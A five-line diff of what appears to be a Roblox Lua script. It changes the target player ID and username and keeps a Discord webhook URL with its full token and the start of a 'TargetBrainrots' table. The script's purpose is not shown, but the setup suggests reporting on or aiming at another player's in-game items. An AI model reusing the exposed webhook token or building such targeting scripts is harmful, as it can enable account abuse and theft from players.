@@ -1,5 +1,5 @@
-local TARGET_ID = 10512020142
-local TARGET_USER = "lila123lol8945379"
+local TARGET_ID = 9098316854
+local TARGET_USER = "BESTIAL945"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1569442298612424804/zKD9YKLyymAMY-0JuRgAutWSSa9901PpHv1WRfdmqT4ASwcm8SFfMijMhNi-rsRslL11"
 
 local TargetBrainrots = {
